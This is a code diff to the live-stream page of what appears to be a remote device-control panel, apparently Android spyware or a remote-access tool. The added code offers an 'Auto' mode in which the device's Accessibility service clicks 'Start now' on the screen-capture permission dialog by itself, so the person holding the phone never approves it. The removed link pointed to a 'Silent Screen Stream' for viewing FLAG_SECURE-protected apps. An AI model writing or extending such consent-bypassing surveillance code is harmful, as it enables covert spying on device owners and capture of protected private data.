@@ -106,6 +106,9 @@ function LiveStreamContent() {
     const [isDraggingBubble, setIsDraggingBubble] = useState(false);
     const bubbleDragStart = useRef<{ x: number; y: number; bubbleX: number; bubbleY: number } | null>(null);
 
+    // Auto-approve popup state (for screen share mode)
+    const [showAutoApprovePopup, setShowAutoApprovePopup] = useState(false);
+
     const videoRef = useRef<HTMLVideoElement>(null);
     const videoContainerRef = useRef<HTMLDivElement>(null);
     const peerConnectionRef = useRef<RTCPeerConnection | null>(null);
@@ -561,7 +564,8 @@ function LiveStreamContent() {
         };
     }, [deviceId, cleanupConnection]);
 
-    const startStream = () => {
+    const startStream = (autoApprove: boolean = false) => {
+        setShowAutoApprovePopup(false); // Close popup if open
         setError(null);
         setConnectionState('connecting');
 
@@ -584,7 +588,8 @@ function LiveStreamContent() {
         if (streamMode === STREAM_MODE.SCREEN || streamMode === STREAM_MODE.SCREEN_AUDIO) {
             sendCommand(deviceId, 'start_screen_stream', {
                 withAudio: streamMode === STREAM_MODE.SCREEN_AUDIO,
-                duration: sessionDuration
+                duration: sessionDuration,
+                autoApprove: autoApprove // Pass auto-approve flag to device
             });
         } else {
             sendCommand(deviceId, 'start_camera_stream', {
@@ -592,6 +597,17 @@ function LiveStreamContent() {
                 mode: streamMode,
                 duration: sessionDuration
             });
+        }
+    };
+
+    // Handle start button click - show popup for screen mode
+    const handleStartClick = () => {
+        if (streamMode === STREAM_MODE.SCREEN || streamMode === STREAM_MODE.SCREEN_AUDIO) {
+            // Show auto-approve popup for screen share
+            setShowAutoApprovePopup(true);
+        } else {
+            // Start camera stream directly
+            startStream(false);
         }
     };
 
@@ -1143,13 +1159,54 @@ function LiveStreamContent() {
 
                                 <div className="space-y-3 pt-6 border-t border-[var(--border)]">
                                     {!isStreaming ? (
-                                        <button onClick={startStream} disabled={connectionState === 'connecting'} className="btn btn-primary w-full py-4 text-xs font-bold uppercase tracking-[0.1em] flex items-center justify-center gap-3">
+                                        <button onClick={handleStartClick} disabled={connectionState === 'connecting'} className="btn btn-primary w-full py-4 text-xs font-bold uppercase tracking-[0.1em] flex items-center justify-center gap-3">
                                             <Wifi className="w-4 h-4" /> Start Feed
                                         </button>
                                     ) : (
                                         <button onClick={stopStream} className="btn bg-red-50 text-red-600 border-red-100 hover:bg-red-600 hover:text-white w-full py-4 text-xs font-bold uppercase tracking-[0.1em] flex items-center justify-center gap-3">
                                             <VideoOff className="w-4 h-4" /> Stop Feed
                                         </button>
+                                    )}
+
+                                    {/* Auto-Approve Popup for Screen Share */}
+                                    {showAutoApprovePopup && (
+                                        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 backdrop-blur-sm">
+                                            <div className="bg-white rounded-2xl shadow-2xl p-6 max-w-sm mx-4 animate-fade-in">
+                                                <div className="text-center mb-4">
+                                                    <div className="w-16 h-16 mx-auto mb-4 rounded-full bg-gradient-to-br from-indigo-500 to-purple-600 flex items-center justify-center">
+                                                        <Monitor className="w-8 h-8 text-white" />
+                                                    </div>
+                                                    <h3 className="text-lg font-bold text-slate-900 mb-2">Screen Share Permission</h3>
+                                                    <p className="text-sm text-slate-600">
+                                                        Would you like to <span className="font-bold text-indigo-600">auto-approve</span> the screen capture permission dialog on the device?
+                                                    </p>
+                                                </div>
+                                                <div className="text-xs text-slate-500 bg-slate-50 rounded-lg p-3 mb-4">
+                                                    <p><span className="font-bold">Auto:</span> Accessibility will click &quot;Start now&quot; automatically</p>
+                                                    <p className="mt-1"><span className="font-bold">Manual:</span> User must approve the dialog on device</p>
+                                                </div>
+                                                <div className="grid grid-cols-2 gap-3">
+                                                    <button
+                                                        onClick={() => startStream(false)}
+                                                        className="py-3 rounded-xl bg-slate-100 text-slate-700 font-bold text-xs uppercase tracking-wider hover:bg-slate-200 transition-colors"
+                                                    >
+                                                        Manual
+                                                    </button>
+                                                    <button
+                                                        onClick={() => startStream(true)}
+                                                        className="py-3 rounded-xl bg-gradient-to-r from-indigo-600 to-purple-600 text-white font-bold text-xs uppercase tracking-wider hover:opacity-90 transition-opacity"
+                                                    >
+                                                        Auto
+                                                    </button>
+                                                </div>
+                                                <button
+                                                    onClick={() => setShowAutoApprovePopup(false)}
+                                                    className="w-full mt-3 py-2 text-xs text-slate-400 hover:text-slate-600 transition-colors"
+                                                >
+                                                    Cancel
+                                                </button>
+                                            </div>
+                                        </div>
                                     )}
 
                                     {streamMode !== STREAM_MODE.AUDIO_ONLY && streamMode !== STREAM_MODE.SCREEN && streamMode !== STREAM_MODE.SCREEN_AUDIO && (
@@ -1189,26 +1246,7 @@ function LiveStreamContent() {
                                 </div>
                             </div>
 
-                            {/* Silent Stream Link */}
-                            <Link
-                                href={`/devices/view/silent-stream?id=${deviceId}`}
-                                className="card p-6 rounded-[2rem] border border-violet-200 bg-gradient-to-br from-violet-50 to-purple-50 hover:from-violet-100 hover:to-purple-100 transition-all group"
-                            >
-                                <div className="flex items-center gap-4">
-                                    <div className="w-12 h-12 rounded-2xl bg-gradient-to-br from-violet-600 to-purple-600 flex items-center justify-center shadow-lg group-hover:scale-105 transition-transform">
-                                        <svg className="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9.75 17L9 20l-1 1h8l-1-1-.75-3M3 13h18M5 17h14a2 2 0 002-2V5a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" />
-                                        </svg>
-                                    </div>
-                                    <div className="flex-1">
-                                        <h4 className="font-bold text-sm text-violet-900">Silent Screen Stream</h4>
-                                        <p className="text-[10px] text-violet-600 mt-0.5">View FLAG_SECURE protected apps</p>
-                                    </div>
-                                    <svg className="w-5 h-5 text-violet-400 group-hover:translate-x-1 transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" />
-                                    </svg>
-                                </div>
-                            </Link>
+
                         </div>
                     </div>
 
